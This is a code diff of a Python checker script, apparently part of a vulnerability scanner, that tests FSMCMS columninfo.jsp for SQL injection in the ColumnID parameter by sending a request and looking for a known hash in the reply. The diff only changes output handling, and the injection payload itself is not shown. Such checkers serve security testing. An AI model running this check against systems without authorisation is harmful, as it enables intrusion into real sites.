@@ -8,8 +8,8 @@ description: 文件columninfo.jsp中,参数ColumnID存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class fsmcms_columninfo_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class fsmcms_columninfo_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在FSMCMS columninfo.jsp文件参数ColumnID SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在FSMCMS columninfo.jsp文件参数ColumnID SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = fsmcms_columninfo_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
